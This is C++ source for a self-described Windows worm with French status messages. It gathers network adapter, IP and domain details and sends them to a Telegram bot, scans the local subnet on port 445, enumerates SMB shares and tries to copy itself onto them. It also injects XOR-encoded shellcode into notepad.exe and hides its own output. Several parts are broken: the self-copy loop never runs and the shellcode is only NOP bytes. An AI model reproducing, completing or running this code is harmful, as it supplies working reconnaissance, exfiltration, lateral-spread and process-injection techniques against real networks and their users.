//.\x86_64-w64-mingw32-g++.exe -o worm.exe worm5.cpp -I "C:\curl\curl\include" -L "C:\curl\curl\lib" -lcurl -lws2_32 -liphlpapi -lnetapi32
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <windows.h>
#include <iphlpapi.h>
#include <lm.h>
#include <curl/curl.h>
#include <sstream>
#include <bitset>
#include <cstdlib>
#include <locale>
#include <codecvt>  
#include <tlhelp32.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

string botToken = ""; 
string chatId = "";  

mutex hostMutex;

wstring stringToWString(const string& str) {
    return wstring(str.begin(), str.end());
}

void sendTelegramMessage(const string& token, const string& chatId, const string& message) {
    CURL* curl = curl_easy_init();
    if (curl) {
        string url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId;
        char* escapedMessage = curl_easy_escape(curl, message.c_str(), message.length());
        url += "&text=" + string(escapedMessage);
        curl_free(escapedMessage);

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            cerr << "Erreur cURL: " << curl_easy_strerror(res) << endl;
        }

        curl_easy_cleanup(curl);
    }
}

unsigned int ipToInt(const string& ip) {
    unsigned int a, b, c, d;
    sscanf(ip.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d);
    return (a << 24) | (b << 16) | (c << 8) | d;
}

string intToIp(unsigned int ip) {
    return to_string((ip >> 24) & 0xFF) + "." +
           to_string((ip >> 16) & 0xFF) + "." +
           to_string((ip >> 8) & 0xFF) + "." +
           to_string(ip & 0xFF);
}

bool isHostAlive(const string& ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    bool isAlive = connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0;
    closesocket(sock);
    return isAlive;
}

void scanNetworkRange(unsigned int startIp, unsigned int endIp, int port, vector<string> &host) {
    for (unsigned int ip = startIp; ip < endIp; ip++) {
        string currentIp = intToIp(ip);
        bool isAlive = isHostAlive(currentIp, port);
        
        string message = "🔹 IP trouvée: " + currentIp;
        
        if (isAlive) {
            message += " (Port " + to_string(port) + " ouvert)";
            
            host.push_back(currentIp);

        } else {
            message += " (Port " + to_string(port) + " fermé)";
        }

        sendTelegramMessage(botToken, chatId, message);
    }
}

void scanNetwork(const string& baseIp, const string& subnetMask, int port, vector<string> &host) {
    unsigned int network = ipToInt(baseIp) & ipToInt(subnetMask);
    unsigned int broadcast = network | (~ipToInt(subnetMask));

    unsigned int rangeSize = (broadcast - network) / 4;  

    vector<thread> threads;
    for (int i = 0; i < 4; ++i) {
        unsigned int startIp = network + i * rangeSize + 1;
        unsigned int endIp = (i == 3) ? broadcast : network + (i + 1) * rangeSize;
        threads.push_back(thread(scanNetworkRange, startIp, endIp, port, ref(host)));
    }

    for (auto& t : threads) {
        t.join();
    }
}

string getDomainName() {
    const char* domain = getenv("USERDOMAIN");
    if (domain) {
        return string(domain);
    }
    return "none";
}

void copytosmb(vector<string> &shares, vector<string> &host) {
    string message;
    int download_nbr = 0;  

    while (download_nbr >= 1) {
        for (const auto& currentHost : host) {
            for (const auto& share : shares) {
                string local_path = "worm.exe";
                string smbPath = "\\\\" + currentHost + "\\" + share;
                if (CopyFile(local_path.c_str(), smbPath.c_str(), FALSE)) {
                    message += "Worm copy successful to: " + smbPath + "\n";
                    download_nbr++;  
                } else {
                    message += "Worm copy failed to: " + smbPath + "\n";
                }
            }
        }
    }
    sendTelegramMessage(botToken, chatId, message);
}

vector<unsigned char> xorEncodeDecode(const vector<unsigned char>& data, const string& key) {
    vector<unsigned char> result(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

vector<unsigned char> generateShellcode() {
    vector<unsigned char> shellcode = {
        0x90, 0x90 
    };

    srand(time(nullptr));
    int nopCount = 5 + (rand() % 11); 

    for (int i = 0; i < nopCount; ++i) {
        shellcode.insert(shellcode.begin(), 0x90);
    }

    string xorKey = "MySecretKey"; 
    return xorEncodeDecode(shellcode, xorKey);
}


void inject_in_process(int pid, vector<unsigned char> shellcode, const string& processName) {
    string message;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        message += "Impossible d'ouvrir le processus.";
        return;
    }

    LPVOID allocatedMemory = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocatedMemory) {
        message += "Impossible d'allouer de la memoire au processus cible";
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode.data(), shellcode.size(), NULL)) {
        message += "Impossible d'ecrire dans la memoire du processus cible";
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    string xorKey = "0X75";
    vector<unsigned char> decodedShellcode(shellcode.size());
    if (!ReadProcessMemory(hProcess, allocatedMemory, decodedShellcode.data(), shellcode.size(), NULL)) {
        message += "Impossible de lire la memoire du processus cible";
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    decodedShellcode = xorEncodeDecode(decodedShellcode, xorKey);

    if (!WriteProcessMemory(hProcess, allocatedMemory, decodedShellcode.data(), decodedShellcode.size(), NULL)) {
        message += "Impossible de reecrire la memoire du processus cible";
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
    if (!remoteThread) {
        message += "Impossible de creer un thread distant";
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    CloseHandle(remoteThread);
    VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
    message += "Injection réussie dans " + processName + " avec PID : " + to_string(pid);
    sendTelegramMessage(botToken, chatId, message);
}

bool searchIdOfProcessSoftware(const string &software, const PROCESSENTRY32 &pe32) {
    string processName(pe32.szExeFile);

    if (processName == software) {
        int pid = pe32.th32ProcessID;
        cout << "The PID of process " << software << " is: " << pid << endl;
        return true;
    }
    return false;
}

void ListSMBShares(const string &serverName,vector<string> &host) {
    string message;
    SHARE_INFO_1* pShares = nullptr;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;

    wstring serverNameW = stringToWString(serverName);
    DWORD dwResult = NetShareEnum(
        const_cast<LPWSTR>(serverNameW.c_str()),
        1,
        (LPBYTE*)&pShares,
        MAX_PREFERRED_LENGTH,
        &dwEntriesRead,
        &dwTotalEntries,
        &dwResumeHandle
    );
    vector<string> shares;
    if (dwResult == NERR_Success) {
        message += "SMB Shares on: " + serverName + " :\n";

        for (DWORD i = 0; i < dwEntriesRead; ++i) {
            char shareName[256];
            wcstombs(shareName, pShares[i].shi1_netname, sizeof(shareName));
            shares.push_back(string(shareName));

            message += "Name of shares: " + string(shareName) + "\n";
        }

        sendTelegramMessage(botToken, chatId, message);
        NetApiBufferFree(pShares);
    } else {
        cerr << "Erreur lors de la récupération des partages SMB depuis : " << serverName << endl;
    }
    copytosmb(shares,host);
}

void GetAllNetworkInfo(const string &botToken, const string &chatId, int port, vector<string> &host,int pid) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "Erreur Winsock" << endl;
        return;
    }

    IP_ADAPTER_INFO adapterInfo[16]; 
    DWORD bufferSize = sizeof(adapterInfo);
    
    string baseIp, subnetMask;
    string message = "🔍 Infos réseau (Wi-Fi uniquement):\n\n";
    
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        while (pAdapter) {
            if (strstr(pAdapter->Description, "Wi-Fi") != nullptr or strstr(pAdapter->Description, "VPN") != nullptr) { 
                message += "🖧 Adaptateur: " + string(pAdapter->Description) + "\n";
                message += "⚙️ MAC: ";
                for (int i = 0; i < (int)pAdapter->AddressLength; i++) {
                    message += to_string((int)pAdapter->Address[i]) + (i != pAdapter->AddressLength - 1 ? ":" : "");
                }
                message += "\n";

                PIP_ADDR_STRING pIpAddr = &pAdapter->IpAddressList;
                while (pIpAddr) {
                    if (pIpAddr->IpAddress.String && strcmp(pIpAddr->IpAddress.String, "0.0.0.0") != 0) {  
                        baseIp = pIpAddr->IpAddress.String;
                        subnetMask = pIpAddr->IpMask.String;
                        message += "📌 IPv4: " + baseIp + "\n";
                        message += "🏷️ Subnet: " + subnetMask + "\n";
                    }
                    pIpAddr = pIpAddr->Next;
                }
            }
            pAdapter = pAdapter->Next;
        }
    } else {
        message += "❌ Erreur récupération des infos réseau.\n";
    }

    string domainName = getDomainName();
    message += "🌐 Domaine Active Directory: " + domainName + "\n";
    thread smblistThread(ListSMBShares, domainName, ref(host));
    smblistThread.join();
    sendTelegramMessage(botToken, chatId, message);
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        cerr << "Erreur" << endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (searchIdOfProcessSoftware("notepad.exe", pe32)) {
                vector<unsigned char> shellcode = generateShellcode();
                inject_in_process(pe32.th32ProcessID, shellcode, pe32.szExeFile);
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    } else {
        cerr << "Erreur" << endl;
    }

    CloseHandle(hProcessSnap);
    scanNetwork(baseIp, subnetMask, port, host);
    WSACleanup();
}
int main() {
    vector<string> host;
    int port = 445;
    string domain = getDomainName();

    freopen("nul", "w", stdout); 
    freopen("nul", "w", stderr); 

    thread networkThread(GetAllNetworkInfo, botToken, chatId, port, ref(host), 0);
    networkThread.join();

    return 0;
}